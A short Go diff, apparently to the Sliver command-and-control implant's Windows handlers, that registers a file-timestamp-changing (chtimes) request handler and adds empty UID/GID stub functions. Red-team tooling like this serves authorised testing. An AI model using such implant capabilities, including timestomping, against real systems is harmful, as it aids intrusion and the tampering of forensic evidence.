@@ -99,6 +99,7 @@ var (
 		sliverpb.MsgExecuteReq:     executeHandler,
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
+		sliverpb.MsgChtimesReq:     chtimesHandler,
 
 		// Extensions
 		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
@@ -745,4 +746,14 @@ func listExtensionsHandler(data []byte, resp RPCResponse) {
 	}
 	data, err = proto.Marshal(lstResp)
 	resp(data, err)
+}
+
+// Stub since Windows doesn't support UID
+func getUid(fileInfo os.FileInfo) (string) {
+	return ""
+}
+
+// Stub since Windows doesn't support GID
+func getGid(fileInfo os.FileInfo) (string) {
+    return ""
 }
